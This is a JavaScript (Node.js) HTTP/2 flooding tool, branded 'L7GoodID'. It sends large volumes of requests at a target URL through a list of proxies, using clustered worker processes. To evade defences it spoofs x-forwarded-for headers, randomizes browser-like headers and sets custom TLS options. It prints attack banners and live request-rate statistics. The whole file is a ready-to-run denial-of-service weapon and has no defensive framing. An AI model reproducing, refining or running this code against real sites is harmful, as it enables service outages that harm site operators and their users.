const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

const colors = {
    red: '\x1b[38;5;196m',
    green: '\x1b[38;5;46m',
    yellow: '\x1b[38;5;226m',
    blue: '\x1b[38;5;39m',
    purple: '\x1b[38;5;129m',
    cyan: '\x1b[38;5;51m',
    pink: '\x1b[38;5;206m',
    orange: '\x1b[38;5;208m',
    white: '\x1b[38;5;255m',
    grey: '\x1b[38;5;244m',
    reset: '\x1b[0m',
    bold: '\x1b[1m',
    dim: '\x1b[2m',
    blink: '\x1b[5m',
    reverse: '\x1b[7m'
};

function showBanner() {
    console.clear();
    console.log(`
${colors.yellow}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${colors.green}⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${colors.cyan} ⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄.
${colors.blue}⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${colors.purple}⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀⠀
${colors.purple}⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧⠀
${colors.yellow}⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋⠀
${colors.green}⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋.⢖⣫⠔⠋⠀⠀⠀
${colors.cyan} ⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀⠀⠀⠀⠀
${colors.blue}⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞⠀⠀⠀⠀
${colors.purple}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀⠀⠀⠀⠀⠀
${colors.pink}⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠁
`);
}

let stats = {
    totalRequests: 0,
    startTime: Date.now(),
    connections: 0
};

function updateStats() {
    stats.totalRequests++;
}

function showStats() {
    const elapsed = ((Date.now() - stats.startTime) / 1000).toFixed(1);
    
    console.clear();
    showBanner();
    
    console.log(`
╔══════════════════════════════════════════════════════════╗
║          【 ATTACK SENT BY L7GoodID🕊️🪽 】                
╠══════════════════════════════════════════════════════════╣
║${colors.cyan}${colors.bold}  🎯 TARGET   :${colors.reset} ${colors.green}${args.target}${colors.reset}
║${colors.cyan}${colors.bold}  ⏱️  ELAPSED  :${colors.reset} ${colors.yellow}${elapsed} detik${colors.reset}
║${colors.cyan}${colors.bold}  📊 REQUESTS :${colors.reset} ${colors.purple}${stats.totalRequests.toLocaleString()}${colors.reset}
║${colors.cyan}${colors.bold}  ⚡ RPS       :${colors.reset} ${colors.blue}${(stats.totalRequests / elapsed).toFixed(0)}${colors.reset}
║${colors.cyan}${colors.bold}  🔌 CONNECT  :${colors.reset} ${colors.pink}${stats.connections}${colors.reset}
║${colors.cyan}${colors.bold}  🕊 MY TEAM   :${colors.reset} ${colors.pink}@L7GoodID${colors.reset}
╚══════════════════════════════════════════════════════════╝
`);
    
    const progress = (Date.now() - stats.startTime) / (args.time * 1000);
    const barLength = 40;
    const filled = Math.floor(progress * barLength);
    const empty = barLength - filled;
    const bar = `${colors.green}${'█'.repeat(filled)}${colors.grey}${'█'.repeat(empty)}${colors.reset}`;
    
    console.log(`${colors.bold}⏳ PROGRESS: [${bar}] ${(progress * 100).toFixed(1)}%${colors.reset}\n`);
}

function showAttackStart() {
    console.log(`${colors.green}${colors.bold}⚡ ATTACK STARTED! ⚡${colors.reset}`);
    console.log(`${colors.dim}${new Date().toLocaleString()}${colors.reset}`);
    console.log(`${colors.cyan}${'═'.repeat(60)}${colors.reset}\n`);
}

// Cek argumen
if (process.argv.length < 6) {
    console.log(`Usage: node HTTP2 URL TIME REQ_PER_SEC THREADS\nExample: node HTTP2 https://tls.mrrage.xyz 500 8 1`);
    process.exit();
}

const ciphers = [
    "TLS_AES_128_CCM_8_SHA256",
    "TLS_AES_128_CCM_SHA256",
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_AES_128_GCM_SHA256"
];

const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";

const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";

const secureOptions = 
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_client_method";

const secureContextOptions = {
    ciphers: ciphers.join(':'),
    sigalgs: sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);

var proxyFile = "proxy.txt";
var proxies = readLines(proxyFile);

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5]
}

const parsedTarget = url.parse(args.target);

// Tampilkan banner sebelum attack
if (cluster.isMaster) {
    showBanner();
    console.log(`
╔══════════════════════════════════════════════════════════╗
║          【 ATTACK SENT BY L7GoodID🕊️🪽 】                
╠══════════════════════════════════════════════════════════╣
║${colors.cyan}${colors.bold}  🎯 TARGET   :${colors.reset} ${colors.green}${args.target}${colors.reset}
║${colors.cyan}${colors.bold}  ⏱️  DURATION :${colors.reset} ${colors.yellow}${args.time} detik${colors.reset}
║${colors.cyan}${colors.bold}  ⚡ RATE      :${colors.reset} ${colors.blue}${args.Rate} req/detik${colors.reset}
║${colors.cyan}${colors.bold}  🧵 THREADS   :${colors.reset} ${colors.purple}${args.threads}${colors.reset}
║${colors.cyan}${colors.bold}  📁 PROXIES   :${colors.reset} ${colors.pink}${proxies.length} proxy${colors.reset}
║${colors.cyan}${colors.bold}  🕊 MY TEAM   :${colors.reset} ${colors.pink}@L7GoodID${colors.reset}
╚══════════════════════════════════════════════════════════╝
`);
    showAttackStart();
    
    // Start stats updater
    setInterval(showStats, 1000);
}

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    for (let i = 0; i < 10; i++) { 
        setInterval(runFlooder, 0); 
    }
}

class NetSocket {
    constructor(){}

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const payload = "CONNECT " + options.address + " HTTP/1.1\r\nHost: " + options.address + "\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true
        });

        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, 10000);
        connection.setNoDelay(true);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const Socker = new NetSocket();

function readLines(filePath) {
    try {
        return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim() !== "");
    } catch (error) {
        console.log(`${colors.yellow}⚠️ Proxy file not found or empty! Using default...${colors.reset}`);
        return ["127.0.0.1:8080"];
    }
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randomCharacters(length) {
    let output = "";
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (let count = 0; count < length; count++) {
        output += randomElement(characters.split(''));
    }
    return output;
}

function getHeaders(parsedTarget, proxyAddr) {
    const parsedProxy = proxyAddr.split(":");
    return {
        ":method": "GET",
        ":path": parsedTarget.path,
        ":scheme": "https",
        ":authority": parsedTarget.host,
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "id,en-US;q=0.9,en;q=0.8,ms;q=0.7,th;q=0.6,zh-CN;q=0.5,zh;q=0.4",
        "accept-encoding": "gzip, deflate, br",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Mobile Safari/537.36",
        "x-forwarded-proto": "https",
        "x-forwarded-for": parsedProxy[0],
        "cache-control": "no-cache, no-store,private, max-age=0, must-revalidate",
        "sec-ch-ua-mobile": randomElement(["?0", "?1"]),
        "sec-ch-ua-platform": randomElement(["Android", "iOS", "Linux", "macOS", "Windows"]),
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "upgrade-insecure-requests": "1",
        "referer": "https://" + parsedTarget.host + parsedTarget.path
    };
}

function runFlooder() {
    if (proxies.length === 0) return;
    
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 15
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        connection.setKeepAlive(true, 60000);
        connection.setNoDelay(true);

        const settings = {
            enablePush: false,
            initialWindowSize: 1073741823
        };

        const tlsOptions = {
            port: 443,
            secure: true,
            ALPNProtocols: ["h2"],
            ciphers: ciphers.join(':'),
            sigalgs: sigalgs,
            requestCert: true,
            socket: connection,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: false,
            host: parsedTarget.host,
            rejectUnauthorized: false,
            clientCertEngine: "dynamic",
            secureOptions: secureOptions,
            secureContext: secureContext,
            servername: parsedTarget.host,
            secureProtocol: secureProtocol
        };

        const tlsConn = tls.connect(tlsOptions);

        tlsConn.allowHalfOpen = true;
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 60 * 1000);
        tlsConn.setMaxListeners(0);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: settings,
            maxSessionMemory: 3333,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn
        });

        stats.connections++;
        
        client.setMaxListeners(0);
        client.settings(settings);

        client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                if (client.destroyed) {
                    clearInterval(IntervalAttack);
                    stats.connections--;
                    return;
                }
                
                for (let i = 0; i < args.Rate; i++) {
                    try {
                        const headers = getHeaders(parsedTarget, proxyAddr);
                        const request = client.request(headers);
                        
                        request.on("response", response => {
                            request.close();
                            request.destroy();
                            updateStats();
                        });
                        
                        request.on("error", () => {
                            request.destroy();
                        });
                        
                        request.end();
                    } catch (e) {}
                }
            }, 1000);
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
            stats.connections--;
        });

        client.on("error", () => {
            client.destroy();
            connection.destroy();
            stats.connections--;
        });
        
        client.on("goaway", () => {
            client.destroy();
            connection.destroy();
            stats.connections--;
        });
        
        client.on("frameError", () => {
            client.destroy();
            connection.destroy();
            stats.connections--;
        });
    });
}

const KillScript = () => {
    if (cluster.isMaster) {
        console.log(`\n${colors.green}${colors.bold}⚔️ ATTACK COMPLETED! SENT BY @L7GoodID${colors.reset}`);
        console.log(`${colors.cyan}Total Requests: ${stats.totalRequests.toLocaleString()}${colors.reset}`);
        console.log(`${colors.yellow}Duration: ${args.time} detik${colors.reset}`);
        console.log(`${colors.purple}Average RPS: ${(stats.totalRequests / args.time).toFixed(0)}${colors.reset}\n`);
    }
    process.exit(1);
};

setTimeout(KillScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});